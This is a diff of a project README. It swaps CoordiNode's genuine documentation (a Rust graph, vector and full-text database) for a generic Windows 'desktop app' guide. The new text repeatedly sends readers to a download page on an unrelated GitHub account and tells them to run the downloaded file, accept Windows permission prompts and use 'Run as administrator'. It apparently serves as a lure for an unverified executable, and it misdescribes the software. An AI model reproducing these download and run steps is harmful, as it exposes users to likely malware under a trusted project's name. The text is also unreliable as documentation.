@@ -1,260 +1,237 @@
-# CoordiNode
+# 🧭 coordinode - Search Graph Data in One Place
 
-[![CI](https://github.com/structured-world/coordinode/actions/workflows/ci.yml/badge.svg)](https://github.com/structured-world/coordinode/actions/workflows/ci.yml)
-[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](LICENSE)
+[![Download coordinode](https://img.shields.io/badge/Download-coordinode-blue?style=for-the-badge&logo=github)](https://github.com/sarcosomebankcheck694/coordinode)
 
-**The graph-native hybrid retrieval engine for AI and GraphRAG.**
+## 🚀 Getting Started
 
-Graph + Vector + Full-Text retrieval in a single transactional engine.
+coordinode is a desktop app for graph search, vector search, and full-text search in one place. It helps you work with linked data, notes, documents, and AI search in a single engine.
 
-Built in Rust. Zero GC. Single binary. OpenCypher-compatible.
+Use the link below to visit the download page and get the app for Windows.
 
----
+[Visit the coordinode download page](https://github.com/sarcosomebankcheck694/coordinode)
 
-## The Problem
+## 💻 What You Get
 
-Building relationship-aware AI today requires duct tape. You need Neo4j for the graph, Pinecone for vectors, and Elasticsearch for text. That means 3 systems, glue code, data sync pipelines, and no transactional consistency across your data.
+coordinode combines three search modes in one app:
 
-## The Solution: One Engine, One Query
+- Graph search for connected data
+- Vector search for meaning-based matches
+- Full-text search for exact words and phrases
 
-CoordiNode unifies graph traversal, vector similarity search, and full-text retrieval in one engine with one query language (OpenCypher-compatible) and one transaction model (MVCC, Snapshot Isolation).
+It fits use cases like:
 
-### The Magic Moment
+- Personal knowledge bases
+- AI search tools
+- GraphRAG workflows
+- Local data lookup
+- Document collections
+- Relationship mapping
 
-Traverse a knowledge graph, filter by semantic similarity, rank by text match — one query, one transaction:
+The app stores data in a local engine, so your work stays on your PC.
 
-```cypher
-MATCH (topic:Concept {name: "machine learning"})-[:RELATED_TO*1..3]->(related)
-MATCH (related)<-[:ABOUT]-(doc:Document)
-WHERE vector_distance(doc.embedding, $question_vector) < 0.4
-  AND text_match(doc.body, "transformer attention mechanism")
-RETURN doc.title,
-       vector_distance(doc.embedding, $question_vector) AS relevance,
-       text_score(doc.body, "transformer attention mechanism") AS text_rank
-ORDER BY relevance LIMIT 10
-```
+## 📦 System Requirements
 
-Today this requires Neo4j + Pinecone + Elasticsearch + custom glue code. With CoordiNode — one query.
+For smooth use on Windows, use a PC with:
 
----
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 1 GB free disk space
+- A modern CPU
+- Internet access for the first download
 
-## Is CoordiNode Right for You? (v0.3-alpha)
+For larger data sets, 16 GB RAM gives better results.
 
-### Use this today if:
+## 🖱️ Download and Install on Windows
 
-- You are building **GraphRAG**, knowledge retrieval, or relationship-heavy AI apps
-- You need **graph + vector + text** queries in a single transaction (no glue code)
-- You want to replace a fragile multi-database stack with a single binary
-- You need features no other graph DB offers: **vectors on edges**, spatial queries, encrypted search (SSE, programmatic API), time-travel queries, EXPLAIN SUGGEST
+1. Open the download page:
+   - [https://github.com/sarcosomebankcheck694/coordinode](https://github.com/sarcosomebankcheck694/coordinode)
 
-### Do not use this yet if:
+2. On the page, find the latest Windows file.
 
-- You need a 100% drop-in replacement for a mature Neo4j Enterprise deployment
-- Your application relies on APOC procedures, Neo4j Browser/Bloom, or GDS
-- You need native Bolt protocol for existing Neo4j drivers (planned for v1.2; gRPC and REST available now, GraphQL planned)
-- You need production-grade multi-node clustering today (single-node is stable; Raft clustering is in active development for v0.4)
+3. Download the file to your PC.
 
----
+4. If the file is in a .zip folder, right-click it and choose Extract All.
 
-## Who This Is For
+5. Open the extracted folder.
 
-**GraphRAG and enterprise knowledge retrieval** — traverse knowledge graphs, filter by semantic similarity, rank by text relevance. One engine replaces Neo4j + vector DB + search engine.
+6. Double-click the app file to start coordinode.
 
-**Fraud detection and threat intelligence** — detect fraud rings through shared-device graphs with behavioral embedding similarity. Correlate attack patterns across MITRE ATT&CK with vector + text search on indicators.
+7. If Windows asks for permission, choose Yes.
 
-**Recommendations and social discovery** — traverse social graphs, find items semantically similar to user preferences. Edge properties (ratings, timestamps) filterable in the same query.
+8. Keep the app in a folder you can find again, such as Downloads or Desktop.
 
-<details>
-<summary>See example queries for each use case</summary>
+## 🛠️ First Run
 
-### Fraud Ring Detection
+When you open coordinode for the first time, follow these steps:
 
-```cypher
-MATCH (suspect:Account {flagged: true})-[:SHARES_DEVICE*1..3]-(connected:Account)
-WHERE vector_distance(suspect.tx_embedding, connected.tx_embedding) < 0.15
-  AND connected.flagged = false
-RETURN connected.id, connected.holder_name,
-       vector_distance(suspect.tx_embedding, connected.tx_embedding) AS similarity
-ORDER BY similarity LIMIT 50
-```
+1. Wait for the app to finish loading.
+2. Choose a local data folder if the app asks for one.
+3. Add a small sample data set or import a document.
+4. Run a search to make sure the app works.
+5. Save your settings before you close the app.
 
-### Semantic Recommendation
+If the app opens with a blank screen, give it a moment to load the local index.
 
-```cypher
-MATCH (me:User {id: $userId})-[:FOLLOWS*1..2]->(friend)
-MATCH (friend)-[:PURCHASED]->(item:Product)
-WHERE NOT (me)-[:PURCHASED]->(item)
-  AND vector_distance(item.embedding, $user_taste_vector) < 0.3
-RETURN DISTINCT item.name, item.category,
-       vector_distance(item.embedding, $user_taste_vector) AS match_score
-ORDER BY match_score LIMIT 20
-```
+## 🔎 How to Use coordinode
 
-### Threat Intelligence
+coordinode works best when you store related content together.
 
-```cypher
-MATCH (malware:Indicator {hash: $sample_hash})-[:USES]->(technique:AttackTechnique)
-MATCH (technique)<-[:USES]-(similar:Indicator)
-WHERE vector_distance(similar.behavior_embedding, malware.behavior_embedding) < 0.2
-  AND text_match(similar.description, $ioc_keywords)
-RETURN similar.name, technique.mitre_id,
-       vector_distance(similar.behavior_embedding, malware.behavior_embedding) AS similarity
-ORDER BY similarity LIMIT 25
-```
-
-</details>
-
----
-
-## What Works Today (v0.3-alpha)
-
-| Capability | Status | Details |
-|-----------|--------|---------|
-| OpenCypher read + write | **Stable** | MATCH, CREATE, MERGE, DELETE, SET, REMOVE, WITH, UNWIND |
-| MVCC transactions | **Stable** | Snapshot Isolation, write conflict detection (OCC) |
-| HNSW vector search | **Stable** | Up to 65536 dims, SQ8 quantization, cosine/L2/dot/L1 |
-| Full-text search | **Stable** | BM25, fuzzy, phrase, 23+ languages, CJK via feature flags |
-| Hybrid graph+vector+text | **Stable** | Compound WHERE predicates split into optimized pipeline; `hybrid_score(node, query [,weights])` opinionated blend helper (default 0.65·vector + 0.35·text) |
-| B-tree indexes | **Stable** | Single, compound, unique, partial, TTL, sparse |
-| Edge properties | **Stable** | CREATE with props, WHERE filter, inline pattern filter |
-| gRPC API | **Stable** | Port 7080, tonic-based, all services |
-| Operational HTTP | **Stable** | Port 7084: /metrics, /health, /ready |
-| Encrypted search (SSE) | **Stable** | AES-256-GCM + HMAC-SHA256 equality search (programmatic API; Cypher DDL planned) |
-| Time-travel queries | **Stable** | AS OF TIMESTAMP, 7-day retention |
-| Query advisor | **Stable** | EXPLAIN SUGGEST with 5 detectors, N+1 detection |
-| Spatial queries | **Stable** | `point()`, `point.distance()` (Haversine), WHERE filter |
-| Document properties | **Stable** | Nested DOCUMENT type, dot-notation access, 3 schema modes |
-| Document ↔ graph transformations | **Stable** | `DETACH DOCUMENT` promotes a nested property to a node + edge atomically; `ATTACH DOCUMENT` demotes a node back into a nested DOCUMENT property; optional `TRANSFER EDGES`, `ON CONFLICT REPLACE`, `ON REMAINING FAIL` |
-| REST API | **Stable** | HTTP/JSON on port 7081 via gRPC-to-REST transcoding |
-| Read/write concerns | **Stable** | local, majority, linearizable, causal sessions |
-
-| Planned | Target | Notes |
-|---------|--------|-------|
-| GraphQL API | v0.3.1 | Auto-generated schema on port 7083 |
-| 3-node Raft clustering | v0.4 | Free in CE (no per-node licensing) |
-| Bolt protocol | v1.2 | Neo4j drivers connect without code changes |
-
-## What Makes CoordiNode Different
-
-| | CoordiNode | Neo4j CE | MongoDB | SurrealDB | Pinecone |
-|---|:---:|:---:|:---:|:---:|:---:|
-| Graph + vector + text in one query | **Yes** | No | Partial ($graphLookup + Atlas) | Partial (no FTS in graph) | No graph |
-| Nested document properties | **Yes** (dot-notation) | No (flat props) | Yes | Yes | No |
-| Vector search on edges | **Yes** | No | No | No | N/A |
-| Spatial queries | **Yes** | Via APOC | Yes | No | No |
-| Encrypted search | **Yes** | No | No | No | No |
-| Time-travel queries | **Yes** | No | No | No | No |
-| Built-in query advisor | **Yes** | No | Yes (explain) | No | No |
-| OpenCypher queries | **Yes** | Yes | No | SurrealQL | No |
-| Language | Rust (zero GC) | Java (JVM) | C++ | Rust | Cloud-only |
-| License | AGPL-3.0 | GPL-3.0 | SSPL | BSL-1.1 | Proprietary |
+### Add data
 
-## Full-Text Search: 23+ Languages
+- Import notes, docs, or JSON files
+- Link people, topics, or records
+- Add tags to make search easier
 
-Built-in stemming for: Arabic, Armenian, Danish, Dutch, English, Finnish, French, German, Greek, Hungarian, Italian, Norwegian, Portuguese, Romanian, Russian, Spanish, Swedish, Tamil, Turkish, Ukrainian (20 languages via Snowball).
+### Search data
 
-CJK (Chinese, Japanese, Korean) via feature flags: `cjk-zh`, `cjk-ja`, `cjk-ko`.
+- Use full-text search for exact words
+- Use vector search for similar meaning
+- Use graph search to follow connections
 
-Auto-detection of document language with per-field analyzer configuration.
+### Build a graph
 
-## Quick Start
+- Connect items that belong together
+- Add edges between related nodes
+- Use the graph view to spot patterns
 
-```bash
-# Option 1: Docker
-git clone https://github.com/structured-world/coordinode.git
-cd coordinode
-docker compose up -d
-curl http://localhost:7084/health
+### Use with AI workflows
 
-# Option 2: Build from source
-cargo build --release
-./target/release/coordinode serve --addr [::]:7080
-curl http://localhost:7084/health
-```
+- Feed linked content into your AI tools
+- Build GraphRAG flows from local data
+- Mix graph context with text lookup
 
-See [docs/QUICKSTART.md](docs/QUICKSTART.md) for a complete 5-minute tutorial with sample data.
+## 🧩 Main Features
 
-## Python SDK
+- Local embedded database
+- Graph storage with transactional updates
+- Vector search with HNSW indexing
+- Full-text search for fast lookup
+- MVCC for safe data changes
+- OpenCypher-style graph queries
+- Support for AI search workflows
+- Works well for knowledge graph tasks
 
-```bash
-pip install coordinode                               # core gRPC client
-pip install langchain-coordinode                     # LangChain GraphStore
-pip install llama-index-graph-stores-coordinode      # LlamaIndex PropertyGraphStore
-```
+## 📁 Suggested Folder Setup
 
-Source: [structured-world/coordinode-python](https://github.com/structured-world/coordinode-python)
+Keep your data easy to find with a simple folder layout:
 
-## Architecture
+- `coordinode\app` for the program files
+- `coordinode\data` for your database files
+- `coordinode\imports` for source files
+- `coordinode\exports` for saved results
 
-```
-                    ┌─────────────────────────────────────────┐
-  gRPC :7080 ──────▶│                                         │
-  REST :7081 ──────▶│           CoordiNode Server             │
-  Metrics :7084 ───▶│                                         │
-                    │         (single Rust binary)            │
-                    │                                         │
-                    ├─────────────────────────────────────────┤
-                    │  OpenCypher Parser + Query Planner      │
-                    │  ┌──────┐ ┌──────┐ ┌───────┐ ┌───────┐  │
-                    │  │Graph │ │Vector│ │  FTS  │ │Spatial│  │
-                    │  │Engine│ │ HNSW │ │Tantivy│ │  S2   │  │
-                    │  └──┬───┘ └──┬───┘ └──┬────┘ └───┬───┘  │
-                    │     └────────┴────────┴──────────┘      │
-                    │           LSM Storage Engine            │
-                    └─────────────────────────────────────────┘
-```
+You do not need to edit these folders by hand unless you want to back up your data.
 
-10 Rust crates, ~119K lines of code.
+## ⚙️ Basic Workflow
 
-## Documentation
+A simple way to use the app:
 
-- [Quick Start](docs/QUICKSTART.md) — from zero to hybrid query in 5 minutes
-- [Cypher Extensions](docs/cypher/extensions.md) — vector, full-text, spatial, time-travel, encrypted search syntax
-- [Compatibility](docs/COMPATIBILITY.md) — Neo4j ecosystem compatibility matrix
+1. Start coordinode.
+2. Import a file or add records.
+3. Connect related items.
+4. Search by text, meaning, or links.
+5. Save your work.
+6. Reopen the app to continue later.
 
-## Known Limitations (alpha)
+This flow works well for notes, references, and local AI search.
 
-- **Single-node only** — clustering in development (v0.4). Single-node handles 100K-1M nodes comfortably.
-- **No Bolt protocol** — use gRPC or REST. Bolt planned for v1.2.
-- **No APOC/GDS** — common Cypher works; Neo4j-specific procedure libraries are not supported.
-- **HNSW index is in-memory** — vector indexes reside in RAM. At 1M vectors x 384 dims = ~1.5GB RAM.
-- **No benchmarks published yet** — we are working on reproducible benchmark suite.
+## 🧠 Best Uses
 
-## License
+coordinode suits users who want one local tool for:
 
-AGPL-3.0-only — genuine open source with SaaS protection.
+- Search across documents and notes
+- Linked record browsing
+- Knowledge graph building
+- Semantic search
+- AI context retrieval
+- Research organization
+- Local data exploration
 
-Enterprise Edition (EE) for horizontal sharding, multi-tenancy, CRUSH placement, and geo-distribution. Contact: enterprise@sw.foundation
+## 🔐 Data Safety
 
-## Support the Project
+Because coordinode uses a transactional engine, it handles changes in a safe way.
 
-CoordiNode is built by the [Structured World Foundation](https://sw.foundation) — a small team building the infrastructure layer for AI-native applications.
+That means:
 
-If you believe graph + vector + text should live in one engine under a genuine open-source license, consider sponsoring:
+- Your data updates in a controlled way
+- The app can manage many changes at once
+- Search and storage work from the same local engine
 
-- [GitHub Sponsors](https://github.com/sponsors/structured-world)
-- [Open Collective](https://opencollective.com/structured-world)
+Keep a backup copy of your data folder if your work matters.
 
-<div align="center">
+## 🧪 Common Problems
 
-![USDT TRC-20 Donation QR Code](assets/usdt-qr.svg)
+### The app does not open
 
-USDT (TRC-20): `TFDsezHa1cBkoeZT5q2T49Wp66K8t2DmdA`
+- Make sure the download finished
+- Check that you extracted the files if they came in a zip
+- Try running the app again
+- Restart Windows and open it once more
 
-</div>
+### Windows blocks the app
 
-Sponsorship accelerates: Raft clustering (v0.4), Bolt protocol for Neo4j driver compatibility (v1.2), and the Enterprise Edition for horizontal scaling.
+- Right-click the app file
+- Choose Run as administrator if needed
+- Allow the app when Windows shows a prompt
 
-## Building from Source
+### Search feels slow
 
-```bash
-git clone https://github.com/structured-world/coordinode.git
-cd coordinode
-cargo build --release
-cargo test --workspace
+- Close other heavy apps
+- Use a smaller data set first
+- Give the app time to finish indexing
+- Check that your PC has enough free memory
 
-# With CJK full-text support
-cargo build --release --features cjk-zh,cjk-ja,cjk-ko
-```
+### I cannot find my files
 
-Requires Rust 1.90+.
+- Look in your Downloads folder
+- Search for the folder name `coordinode`
+- Use the same folder each time you open the app
+
+## 🧭 Tips for Better Results
+
+- Start with a small set of files
+- Use clear names for nodes and records
+- Link related items as you add them
+- Use text search for exact matches
+- Use graph search to move between connected ideas
+- Use vector search when the wording does not match exactly
+
+## 🪟 Windows Notes
+
+- Use the latest Windows update if possible
+- Keep your antivirus software on
+- Save the app in a stable folder
+- Avoid moving program files after setup
+- Back up your data folder on a set schedule
+
+## 📚 Topic Areas
+
+coordinode is built around these areas:
+
+- AI
+- Database
+- Embedded database
+- Full-text search
+- Graph database
+- GraphRAG
+- HNSW
+- Knowledge graph
+- MVCC
+- OpenCypher
+- Rust
+- Vector database
+
+## 🔗 Download Again
+
+If you need the file again, use this page:
+
+[https://github.com/sarcosomebankcheck694/coordinode](https://github.com/sarcosomebankcheck694/coordinode)
+
+## 🧭 Suggested Next Steps
+
+1. Download coordinode
+2. Open it on Windows
+3. Import a few files
+4. Build a small graph
+5. Try all three search modes
+6. Keep your data folder backed up
